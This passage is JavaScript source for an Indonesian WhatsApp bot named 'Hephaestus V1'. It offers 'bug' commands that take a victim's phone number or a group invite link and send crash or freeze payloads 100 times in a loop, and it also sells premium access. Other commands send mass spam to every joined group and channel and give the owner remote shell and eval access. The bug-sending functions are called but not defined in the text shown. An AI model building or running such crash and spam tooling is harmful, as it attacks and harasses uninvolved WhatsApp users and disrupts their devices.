> ꧈ *𝚃𝙸𝙼𝙴 𝙸𝙽𝙵𝙾*
   *𝚆𝙸𝙱 : ${wib}*
   *𝚆𝙸𝚃 : ${wit}*
   *𝚆𝙸𝚃𝙰 : ${wita}*
   *𝚃𝙰𝙽𝙶𝙶𝙰𝙻 : ${hariini}*

> ꧈ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃*
   *𝙱𝙾𝚃𝙽𝙰𝙼𝙴 : ${botName}*
   *𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝚅𝟷 𝙶𝙴𝙽 𝟷*
   *𝙼𝙾𝙳𝙴 𝙱𝙾𝚃 : ${client.public ? "𝙿𝚞𝚋𝚕𝚒𝚌":"𝙿𝚛𝚒𝚟𝚊𝚝𝚎"}*
   *𝙲𝚁𝙴𝙰𝚃𝙾𝚁 : ${OwnerName}*

> ꧈ *𝙸𝙽𝙵𝙾 𝚂𝙴𝚁𝚅𝙴𝚁*
   *𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${runtime(process.uptime())}*
   *𝚄𝙿𝚃𝙸𝙼𝙴 𝚅𝙿𝚂 : ${runtime(os.uptime())}*

> ꧈ *𝙱𝚄𝙶 𝙽𝙾𝙼𝙾𝚁*
*.hephforce-v1*
> .hephforce-v1 𝟼𝟸𝟾𝚡𝚡𝚡

*.hephforce-v2* 
> .hephforce-v2 𝟼𝟸𝟾𝚡𝚡𝚡

*.hephdelay-maker* 
> .hephdelay-maker 𝟼𝟸𝟾xxx

*.hephsystem-ui* 
> .hephsystem-ui 𝟼𝟸𝟾𝚡𝚡𝚡

*.hephdelayxforce* 
> hephdelayxforce 𝟼𝟸𝟾𝚡𝚡𝚡

*.hephuixforce*
> .hephuixforce 𝟼𝟸𝟾𝚡𝚡𝚡

> ꧈ *𝙱𝚄𝙶 𝙶𝚁𝙾𝚄𝙿*
*.hephgb-v1*
> .hephgb-v1 https://chat.whatsapp.com/

*.hephgb-v2* 
> .hepgb-v2 https://chat.whatsapp.com/
`;
client.sendMessage(m.chat, {
       image: { url: `${global.imageUrl}` },
       caption: captionText,
       footer: "© Created By AldzDeveloper",
       contextInfo: {
        externalAdReply: {
        showAdAttribution: true,
            containsAutoReply: true,
          thumbnailUrl: `${global.imageUrl2}`, 
          title: `𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎`,
          body: "© AldzDeveloper",
          sourceUrl: `${global.linkch}`,
          renderLargerThumbnail: true,
          mediaType: 1,
        },
      },
buttons: [
{ buttonId: ".owner", 
buttonText: { 
displayText: '𝙾𝚆𝙽𝙴𝚁' }},
{ buttonId: ".sc", 
buttonText: {
displayText: "𝚂𝙲𝚁𝙸𝙿𝚃" }},
{ buttonId: ".menu", 
buttonText: {
displayText: "𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄" }}
],
viewOnce: true,
  headerType: 6
    }, { quoted: qkontak })
} 
break
case 'hephforce-v1':{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Proses Sending Bug To Target ${pepec}_*`,
     }, { quoted: qkontak })
await sleep(2000) 
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Succes Sending Bug To Target ${pepec}_*`, 
     buttons: [ 
     {
     buttonId: `.hephforce-v1 ${org}`, 
     buttonText: {
        displayText: "1x ʟᴀɢɪ" }
     }
     ]
     }, { quoted: qkontak })
       for (let i = 0; i < 100; i++) {
     await HephForceV1(org)
       }
      reply("Succes Send Bug")
 }
break
case 'hephforce-v1':{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Proses Sending Bug To Target ${pepec}_*`, 
     }, { quoted: qkontak })
await sleep(2000) 
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Succes Sending Bug To Target ${pepec}_*`, 
     buttons: [ 
     {
     buttonId: `.hephforce-v1 ${org}`, 
     buttonText: {
        displayText: "1x ʟᴀɢɪ" }
     }
     ]
     }, { quoted: qkontak })
       for (let i = 0; i < 100; i++) {
     await HephForceV2(org) 
       }
 }
break
case 'hephdelay-maker':{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Proses Sending Bug To Target ${pepec}_*`, 
     }, { quoted: qkontak })
await sleep(2000) 
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Succes Sending Bug To Target ${pepec}_*`, 
     buttons: [ 
     {
     buttonId: `.hephdelay-maker ${org}`, 
     buttonText: {
        displayText: "1x ʟᴀɢɪ" }
     }
     ]
     }, { quoted: qkontak })
       for (let i = 0; i < 100; i++) {
     await HephDelayMaker(org)
       }
 }
break
case 'hephsystem-ui':{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Proses Sending Bug To Target ${pepec}_*`, 
     }, { quoted: qkontak })
await sleep(2000) 
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Succes Sending Bug To Target ${pepec}_*`, 
     buttons: [ 
     {
     buttonId: `.hephsystem-ui ${org}`, 
     buttonText: {
        displayText: "1x ʟᴀɢɪ" }
     }
     ]
     }, { quoted: qkontak })
       for (let i = 0; i < 100; i++) {
     await HephSystemUi(org)
       }
 }
break
case 'hephdelayxforce':{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Proses Sending Bug To Target ${pepec}_*`, 
     }, { quoted: qkontak })
await sleep(2000) 
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Succes Sending Bug To Target ${pepec}_*`, 
     buttons: [ 
     {
     buttonId: `.hephdelayxforce ${org}`, 
     buttonText: {
        displayText: "1x ʟᴀɢɪ" }
     }
     ]
     }, { quoted: qkontak })
       for (let i = 0; i < 100; i++) {
     await HephDelayXForce(org) 
       }
 }
break
case 'hephuixforce':{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Proses Sending Bug To Target ${pepec}_*`,
     }, { quoted: qkontak })
await sleep(2000) 
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Succes Sending Bug To Target ${pepec}_*`, 
     buttons: [ 
     {
     buttonId: `.hephuixforce ${org}`, 
     buttonText: {
        displayText: "1x ʟᴀɢɪ" }
     }
     ]
     }, { quoted: qkontak })
       for (let i = 0; i < 100; i++) {
     await HephUIXForce(org)
       }
 }
break
case "hephgb-v1": {
if (!isCreator && !isPremium) return reply(mess.prem);
if (!text || !text.includes("chat.whatsapp.com")) {
return reply("⚠️ Kirim *link grup WhatsApp*!\nContoh: .crash-gb https://chat.whatsapp.com/XXXX")};
let linkgc = text.trim();
let code = linkgc.split("https://chat.whatsapp.com/")[1];
if (!code) return reply("⚠️ Link grup tidak valid!");
let res = await client.groupAcceptInvite(code).catch(e => reply("❌ Gagal join grup!"));
let target = res; // Format: 120xxxxxxxx@g.us
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Proses Sending Bug To Group ${target}_*`
     }, { quoted: qkontak })
   for (let i = 0; i < 5; i++) {
  await SystemUi1(client, target);
  await SystemUi2(client, target);
        await sleep(1200);
    }
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Succes Sending Bug To Group ${target}_*`
     }, { quoted: qkontak })
}
break
case "hephgb-v2": {
if (!isCreator && !isPremium) return reply(mess.prem);
if (!text || !text.includes("chat.whatsapp.com")) {
return reply("⚠️ Kirim *link grup WhatsApp*!\nContoh: .crash-gb https://chat.whatsapp.com/XXXX")};
let linkgc = text.trim();
let code = linkgc.split("https://chat.whatsapp.com/")[1];
if (!code) return reply("⚠️ Link grup tidak valid!");
let res = await client.groupAcceptInvite(code).catch(e => reply("❌ Gagal join grup!"));
let target = res; // Format: 120xxxxxxxx@g.us
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Proses Sending Bug To Group ${target}_*`
     }, { quoted: qkontak })
   for (let i = 0; i < 5; i++) {
  await SpaceGroup(target);
  await SpaceGroup(target);
        await sleep(1200);
    }
await client.sendMessage(m.chat, { 
     image: { url: `${global.imageUrl}` }, 
     caption: `*_Succes Sending Bug To Group ${target}_*`
     }, { quoted: qkontak })
}
break
case "jpmch-v1": {
if (!isCreator) return reply(mess.owner)
if (channel.length < 1) return reply("Tidak ada id ch didalam database idch")
if (!text) return reply("teksnya & foto (opsional)")
let rest
if (/image/.test(mime)) {
rest = await client.downloadAndSaveMediaMessage(qmsg)}
const res = channel
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const jid = m.chat
await reply(`Memproses ${rest !== undefined ? "jpm teks & foto" : "jpm teks"} ke ${res.length} Channel WhatsApp`)
for (let i of res) {
try {
await client.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(5000)}
if (rest !== undefined) await fs.unlinkSync(rest)
await client.sendMessage(jid, {text: `Jpm ${rest !== undefined ? "teks & foto" : "teks"} berhasil dikirim ke ${count} Channel WhatsApp`}, {quoted: qkontak})}
break
case "jpmch-v2": {
if (!isCreator) return m.reply(mess.owner)
if (channel.length < 1) return m.reply("Tidak ada id ch didalam database idch")
if (!text) return m.reply("teksnya & video (opsional)")
let rest
if (/video/.test(mime)) {
rest = await client.downloadAndSaveMediaMessage(qmsg)
}
const res = channel
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { video: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const jid = m.chat
await m.reply(`Memproses ${rest !== undefined ? "jpm teks & video" : "jpm teks"} ke ${res.length} Channel WhatsApp`)

for (let i of res) {
try {
await client.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(5000)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await client.sendMessage(jid, {text: `Jpm ${rest !== undefined ? "teks & video" : "teks"} berhasil dikirim ke ${count} Channel WhatsApp`}, {quoted: qkontak})
}
break
case "addidch": {
if (!isCreator) return m.reply(mess.owner)
let ids
if (text.includes("https://whatsapp.com/channel")) {
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
ids = [res.id]
} else if (text.includes("@newsletter")) {
ids = text.split(",").map(i => i.trim()) 
if (ids.some(id => !id.endsWith("@newsletter"))) {
return reply("idch1,idch2 (bisa berapapun)")}
} else {
return reply("idch1, idch2 (bisa berapapun) bisa pake linkchnya juga)")}
let newIds = ids.filter(id => !channel.includes(id)) // Hindari duplikasi
if (newIds.length === 0) {
return reply("Semua ID yang dimasukkan sudah ada dalam daftar ❌")}
channel.push(...newIds) // Tambahkan ID baru
try {
await fs.writeFileSync("./database/channel.json", JSON.stringify(channel, null, 2))
reply(`Berhasil menambah ${newIds.length} ID channel ✅`)
} catch (err) {
console.error("Error menyimpan file:", err)
m.reply("Terjadi kesalahan saat menyimpan data ❌")}
    }
break
case "listidch": {
if (channel.length < 1) return reply("Tidak ada id ch didalam database idch")
let teks = `\n *Total ID Channel :* ${channel.length}\n`
for (let i of channel) {
let res = await client.newsletterMetadata("jid", i)
teks += `\n* ${i}
* ${res.name}\n`}
client.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: qkontak})}
break
case "delidch": {
if (!isCreator) return reply(mess.owner)
if (channel.length < 1) return reply("Tidak ada id ch didalam database idch")
if (!text) return reply("idchnya")
let input = text
if (text == "all") {
channel.length = 0
await fs.writeFileSync("./database/channel.json", JSON.stringify(channel, null, 2))
return reply(`Berhasil menghapus semua ID Channel ✅`)}
if (!channel.includes(input)) return reply(`ID Channel tidak ditemukan!`)
let posi = channel.indexOf(input)
await channel.splice(posi, 1)
await fs.writeFileSync("./database/channel.json", JSON.stringify(channel, null, 2))
reply(`Berhasil menghapus ID Channel ✅`)
}
break
case "jpmgrup-v1": {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply("Masukkan teks yang ingin dikirim!")
let allgrup = await client.groupFetchAllParticipating()
let res = Object.keys(allgrup) 
let count = 0
const jid = m.chat
const teks = text
if (!global.owner) {
console.error("Error: global.owner belum didefinisikan!")
return m.reply("Owner belum diatur di konfigurasi bot.")}
await reply(`Memproses *JPM* teks ke ${res.length} grup...`)
for (let i of res) {
try {
await client.sendMessage(i, {text: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: global.owner ? { businessOwnerJid: global.owner + "@s.whatsapp.net" } : undefined, forwardedNewsletterMessageInfo: ("𝐀𝐥𝐝𝐳 𝕺𝖋𝖋𝖎𝖈𝖎𝖆𝖑" && global.idch) ? { newsletterName: "𝐀𝐥𝐝𝐳 𝕺𝖋𝖋𝖎𝖈𝖎𝖆𝖑", newsletterJid: global.idch} : undefined }
}, { quoted: qkontak })
count += 1
console.log(`✅ Berhasil mengirim ke ${i}`)
} catch (e) {
console.error(`❌ Gagal mengirim ke ${i}:`, e)}
await sleep(7000) 
}
await client.sendMessage(jid, {text: `*Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}`}, { quoted: qkontak})
}
break
case "buatgc": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(example("nama grup"))
let res = await client.groupCreate(q, [])
const urlGrup = "https://chat.whatsapp.com/" + await client.groupInviteCode(res.id)
let teks = `
*Grup WhatsApp Berhasil Dibuat ✅*
${urlGrup}
`
return reply(teks)
}
break
case "add": {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.admin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m.chat, [users], 'add')
await reply(`sukses kak`)
}
break
case "jpmgrup-v2": {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply("teks dengan mengirim foto")
if (!/image/.test(mime)) return m.reply("teks dengan mengirim foto")
const allgrup = await client.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await client.downloadAndSaveMediaMessage(qmsg)
await reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
try {
await client.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: "𝐀𝐥𝐝𝐳 𝕺𝖋𝖋𝖎𝖈𝖎𝖆𝖑", newsletterJid: global.idch }}}, {quoted: qkontak})
count += 1
} catch {}
await sleep(7000)
}
await fs.unlinkSync(rest)
await client.sendMessage(jid, {text: `*Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qkontak})
}
break
case 'tourl': {
if (!mime) return reply(`Kirim/Reply Video/Gambar Dan Audio Dengan Caption ${prefix + command}`);
try {
let media = await client.downloadAndSaveMediaMessage(quoted);
if (/image|video|audio/.test(mime)) {
let response = await CatBox(media);
reply(`> ᴜʀʟ : ${response}`);
	} else {
            reply(`Maaf, hanya gambar, video, atau audio yang dapat diunggah.`);
        }

        // Menghapus file setelah diunggah
      await fs.unlinkSync(media);
    } catch (err) {
        reply(".tourl dengan mengirim foto/vidio/audio");
   }
			}
break
case "cekidch": case "idch": {
    if (!text) return m.reply(".cekidch linkchnya")
    if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await client.newsletterMetadata("invite", result)
        if (!res) return m.reply("Gagal mengambil metadata")
        let teks = `
*ID :* ${res.id}
        `
        return m.reply(teks)
    } catch (error) {
        console.error(error);
        return m.reply("Terjadi kesalahan saat mengambil metadata");
    }
}
break
            case 'hd': case 'hdr': case 'remini': {
            const quoted = m.quoted ? m.quoted : m;
            const mime = (quoted.msg || quoted).mimetype || "";
            if (/image/.test(mime)) {
            await client.sendMessage(
                m.chat, 
                { caption: "Reply Image yg mau di remini/Hd" },
                { quoted: qkontak });
                return;
                } 
                let media = await m.quoted.download()
                let proses = await remini(media, "enhance");
            await client.sendMessage(
                m.chat, 
                { image: proses, 
                  caption: 'Done' }, 
                { quoted: qkontak });
            }
break;
case 'hdvid': {
if (!isPremium) return reply(mess.prem)
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    if (/video/.test(mime)) {
      await client.sendMessage(
        m.chat,
        { caption: "Tolong kirimkan video yang ingin diubah." },
        { quoted: qkontak });
      return;
    }
    reply("Waiting..");
    try {
      const media = await m.quoted.download();
      const videoPath = path.join(__dirname, "video.mp4");
      const outputPath = path.join(__dirname, "output.mp4");
      fs.writeFileSync(videoPath, media);
      await VideoHD(videoPath, outputPath, async (err, videoPath) => {
        if (err) {
          await client.sendMessage(
            m.chat,
            { caption: "Terjadi kesalahan saat mengubah video." },
            { quoted: qkontal },
          );
          return;
        }
        await client.sendMessage(
          m.chat,
          {
            video: { url: videoPath },
            caption: "Ini adalah video yang telah diubah menjadi HD.",
          },
          { quoted: qkontak },
        );
        fs.unlink(videoPath, (err) => {
          if (err) {
            console.error(
              "Terjadi kesalahan saat menghapus video input:",
              err.message,
            );
          } else {
            console.log("File video input berhasil dihapus.");
          }
        });
        fs.unlink(outputPath, (err) => {
          if (err) {
            console.error(
              "Terjadi kesalahan saat menghapus video output:",
              err.message,
            );
          } else {
            console.log("File output berhasil dihapus.");
          }
        });
      });
    } catch (error) {
      console.error("Terjadi kesalahan saat mengunduh video:", error.message);
      await client.sendMessage(
        m.chat,
        { caption: "Terjadi kesalahan saat mengunduh video." },
        { quoted: qkontak },
      );
    }
}
break
case "addprem":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628Xxxx`)
anj = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(anj)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(anj)
fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
reply(`Nomor ${anj} Telah Menjadi Premium!`)
}
break
case 'delprem': {
if (!isCreator) return reply(mess.owner);
if (args.length < 1) return reply(`Use :\n*#delprem* @tag\n*#delprem* number`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
fs.writeFileSync("./database/premium.json", JSON.stringify(premium));}
reply("Delete success");
} else {
premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
reply("Success")};
}
break
case "self":{
    if (!isCreator) return reply(mess.owner) 
    client.public = false
    reply(`successfully changed to ${command}`)
}
break
case "public":{
    if (!isCreator) return reply(mess.owner) 
    client.public = true
    reply(`successfully changed to ${command}`)
}
break           
case "backup":{
if (!isCreator) return reply(mess.owner);
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await client.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: qkontak}); await execSync("rm -rf backup.zip");
}
break
      case 'script': {
let buy = `
*\`「 𝐒𝐂 𝐇𝐄𝐏𝐇𝐀𝐄𝐒𝐓𝐔𝐒 𝐕𝟏 」\`*

> *Script Ini Dijual Karena Ini Versi VIP, Tunggu Owner Membuat Versi Free*

> *Jika Mau Beli Sc ini Yang Versi VIP, Hubungi Nomor Di Bawah*

Whatsapp Chat : https://wa.me/message/RQFJAGR2G7ZDA1
Telegram Chat : t.me/Aldzofficial`
client.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 70000000,
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
}
    break       
case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'erlangga.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
    reply('Terjadi kesalahan saat menulis file:', err);
} else {
    reply('Case baru berhasil ditambahkan.');
}
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
 case "sendsc": {
  if (!isCreator) return reply('*Fitur Ini Khusus Bang Erlangga*')
  
  if (!args[0]) return reply(example("628xxx"));
  
  let targetNumber = args[0]
  if (!targetNumber.startsWith('62')) return m.reply(example("628xxx"))
  
  await reply("Memproses pengiriman script bot")
  var name = `𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬𝐕𝟏`
  
  const ls = (await execSync("ls"))
    .toString()
    .split("\n")
    .filter(
      (pe) =>
        pe != "node_modules" &&
        pe != "session" &&
        pe != "package-lock.json" &&
        pe != "yarn.lock" &&
        pe != ""
    )
    
  const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
  
  await client.sendMessage(`${targetNumber}@s.whatsapp.net`, {
    document: await fs.readFileSync(`./${name}.zip`),
    fileName: `${name}.zip`,
    mimetype: "application/zip"
  }, {quoted: qkontak })
  
  await execSync(`rm -rf ${name}.zip`)
  
  return reply(`*Script bot berhasil dikirim ke nomor*\n *📞 ${targetNumber}*`)
}
break;
case "getcase": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./erlangga.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
reply(`${getcase(q)}`)
} catch (e) {
return reply(`Case *${text}* Tidak Ditemukan`)
}
}
break  
case "delowner":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return m.reply(`Example Use :\n${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')
let no = '@s.whatsapp.net'
let unp = creator.indexOf(ya)
creator.splice(unp, 1)
fs.writeFileSync("./database/owner.json", JSON.stringify(creator))
reply(`Sussces Del Owner ${no}`)
}
break
case "addowner":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return m.reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
creator.push(prrkek)
fs.writeFileSync("./database/owner.json", JSON.stringify(creator))
reply(`*\`${prrkek} SUKSES MENJADI OWNER!!\`*`)
}
break    
    default:
    if (budy.startsWith('$')) {
        if (!isCreator) return;
        exec(budy.slice(2), (err, stdout) => {
if (err) return reply(err)
if (stdout) return reply(stdout);
        });
    }
    
    if (budy.startsWith('>')) {
        if (!isCreator) return;
        try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await reply(evaled);
        } catch (err) {
reply(String(err));
        }
    }
        
    if (budy.startsWith('<')) {
        if (!isCreator) return
        let kode = budy.trim().split(/ +/)[0]
        let teks
        try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
        } catch (e) {
teks = e
        } finally {
await reply(require('util').format(teks))
        }
    }
        
        }
  } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
